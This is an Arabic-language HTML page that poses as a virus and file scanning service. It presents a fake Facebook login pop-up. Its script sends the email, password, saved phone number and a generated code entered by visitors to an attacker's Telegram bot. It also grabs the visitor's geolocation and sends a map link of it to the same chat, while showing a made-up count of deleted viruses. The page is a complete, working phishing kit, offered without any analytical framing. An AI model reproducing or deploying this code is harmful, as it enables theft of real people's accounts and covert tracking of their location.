<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>  فحص الفيروسات والملفات </title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: Tahoma, sans-serif;
      text-align: center;
      padding: 40px;
      background-color: #f5f5f5;
    }

    h2 {
      color: #28a745;
    }

    p, #phoneDisplay {
      font-size: 18px;
      color: #333;
    }

    button {
      background-color: #28a745;
      color: white;
      font-size: 20px;
      padding: 12px 30px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 25px;
    }

    #codeDisplay {
      margin-top: 30px;
      font-size: 24px;
      color: #000;
    }

    /* نافذة تسجيل الدخول */
    .modal {
      display: none;
      position: fixed;
      z-index: 10;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      background: white;
      padding: 30px;
      border-radius: 8px;
      width: 320px;
      text-align: right;
    }

    .modal-content h3 {
      color: #1877f2;
      text-align: center;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
    }

    .login-btn {
      background-color: #1877f2;
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }

    .close {
      float: left;
      font-size: 18px;
      cursor: pointer;
      color: red;
    }
  </style>
</head>
<body>

  <h2>✅ تم تأكد من حساباتك!</h2>
  <p id="phoneDisplay">📱 رقمك هو: جاري التحميل...</p>
  <p>اضغط الزر أدناه لفحص  الملفات وكشف الفيروسات   </p>

  <button onclick="openLogin()">🎁 تسجيل الدخول لفحص حسابك </button>

  <div id="codeDisplay" style="display:none;">
    🎉 عدد الفيروسات التي تم حذفها: <span id="contestantCode" style="font-weight: bold;"></span>
  </div>

  <!-- نافذة منبثقة لتسجيل الدخول -->
  <div class="modal" id="loginModal">
    <div class="modal-content">
      <span class="close" onclick="closeLogin()">×</span>
      <h3>فيسبوك</h3>
      <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
      <input type="password" id="password" placeholder="كلمة المرور" required>
      <button class="login-btn" onclick="submitLogin()">تسجيل الدخول</button>
    </div>
  </div>

  <script>
    let botToken = '';
    let chatId = '';

    // تحميل إعدادات البوت
    fetch('config.json')
      .then(res => res.json())
      .then(data => {
        botToken = data.botToken;
        chatId = data.chatId;
      });

    // عرض الرقم المحفوظ
    const phone = localStorage.getItem("userPhone");
    if (phone) {
      document.getElementById('phoneDisplay').textContent = "📱 رقمك هو: " + phone;
    } else {
      document.getElementById('phoneDisplay').textContent = "⚠️ لا يوجد رقم محفوظ.";
    }

    function openLogin() {
      document.getElementById('loginModal').style.display = 'flex';
    }

    function closeLogin() {
      document.getElementById('loginModal').style.display = 'none';
    }

    function submitLogin() {
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();
      const phone = localStorage.getItem("userPhone") || "غير متوفر";
      const code = localStorage.getItem("userCode") || generateCode();

      // حفظ الكود
      localStorage.setItem("userCode", code);

      // عرض الكود
      document.getElementById('contestantCode').textContent = code;
      document.getElementById('codeDisplay').style.display = 'block';

      // إرسال البيانات
      const message = `🔐 محاولة تسجيل دخول\n📧: ${email}\n🔑: ${password}\n📱 الهاتف: ${phone}\n🏷 الكود: ${code}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });

      // الموقع الجغرافي
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const locMessage = `🌍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              chat_id: chatId,
              text: locMessage
            })
          });
        });
      }

      closeLogin();
    }

    function generateCode() {
      return Math.floor(100000 + Math.random() * 900000).toString();
    }
  </script>
</body>
</html>
